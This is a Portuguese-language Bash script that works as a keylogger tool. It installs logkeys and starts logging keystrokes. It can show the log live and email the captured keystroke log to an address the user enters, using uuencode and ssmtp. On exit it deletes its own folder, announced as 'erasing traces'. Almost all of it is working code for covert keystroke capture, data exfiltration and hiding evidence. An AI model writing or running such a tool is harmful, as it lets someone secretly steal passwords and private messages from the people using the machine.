#!/bin/bash

data=`date +%d-%m-%y`

arquivo1='keyloggerlinux/'
arquivo2='/etc/default/logkeys'

echo -e "INICIANDO O SISTEMA DE KEYLOGGER"
sleep 1
echo -e " -> INICIANDO DOWNLOADS NECESSÁRIOS"
sleep 1

if [ -f "$arquivo2" ]; then
	echo -e " -> LOGKEYS JÁ BAIXADO!"
        sleep 1
else
	echo -e " -> LOGKEYS NÃO ENCONTRADO. BAIXANDO..."
        apt-get install logkeys -y > /dev/null
        echo -e " -> OK"
        sleep 1
fi

log="/var/log/logkeys.log"

while :
do
echo ""
echo -e "================MENU================="
echo "-------------------------------------"
echo -e "COMO PROSSEGUIR?"
echo -e "[0] INICIAR KEYLOGGER"
echo -e "[1] ABRIR JANELA DO LOGKEYS"
echo -e "[2] ENVIAR LOGS POR E-MAIL"
echo -e "[3] PARAR KEYLOGGER E SAIR DO SISTEMA"
echo -e "[4] SÓ SAIR"
echo "------------------------------------"
read resposta
case "$resposta" in
	0|"")
        echo -e "OPÇÃO $resposta -> INICIANDO O KEYLOGGER:"
	    logkeys -s -m keymaps/pt_BR.map
	    sleep 1
	    echo -e " -> INICIADO!"
	    sleep 1
	    clear
	;;
	1)
        echo -e "OPÇÃO $resposta -> ABRINDO JANELA DE LOG DO LOGKEYS E INICIANDO O SISTEMA: "
	if pgrep gnome-terminal > /dev/null
	then
	        gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
	else
	    	apt-get install gnome-terminal -y > /dev/null
	       	gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
	fi
	sleep 1
	clear
	;;
	2)
        echo -e "OPÇÃO $resposta -> DIGITE O E-MAIL PARA ENVIAR OS LOGS?"
	read email
	sleep 1
	echo -e "ENVIANDO LOGS PARA: $email"
	subject="Relatorio de acesso - Keylogger"
   	content="Confira o que foi digitado em sua máquina. Anexo!"
   	(echo -e "$subject\n$content\n"; uuencode $log logkeys.txt ) | ssmtp $email
	sleep 1
	echo -e "E-MAIL ENVIADO!"
	sleep 1
	clear
    	;;
    	3)
        echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
	sleep 1
	echo -e " -> SAINDO..."
	sleep 1
	logkeys -k
	sleep 1
	echo " -> APAGANDO RASTROS"
	sleep 1
	if [ -f "$arquivo1" ]; then
		echo -e " -> APAGANDO PASTA $arquivo1"
		cd ..
	      	rm -rf keyloggerlinux/
		sleep 1
	else
    		echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
	    	sleep 1
	fi
	echo -e " -> SISTEMA FINALIZADO."
        exit
	;;
        4)
	echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
        cd ..
        echo -e " -> SAINDO DO SISTEMA"
        sleep 1
	if [ -f "$arquivo1" ]; then
                echo -e " -> APAGANDO $arquivo1"
	        cd ..
        	rm -rf keyloggerlinux/
                sleep 1
	else
                echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
               	sleep 1
	fi
        echo -e " -> SISTEMA FINALIZADO."
        exit
	;;
    	*)
	echo " -> OPÇÃO $resposta -> OPÇÃO INVÁLIDA!"
        sleep 1
	clear
;;
esac
done

